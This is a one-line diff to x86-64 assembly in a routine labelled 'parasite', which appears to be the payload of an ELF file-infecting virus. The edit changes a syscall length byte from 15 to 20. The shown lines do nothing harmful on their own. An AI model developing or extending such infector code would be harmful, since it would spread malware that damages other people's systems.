@@ -73,7 +73,7 @@ parasite:
 	mov rdi, rax
 	mov rsi, r10
 	xor rdx, rdx
-	mov dl, 15
+	mov dl, 20
 	syscall
 
 	xor	rax, rax
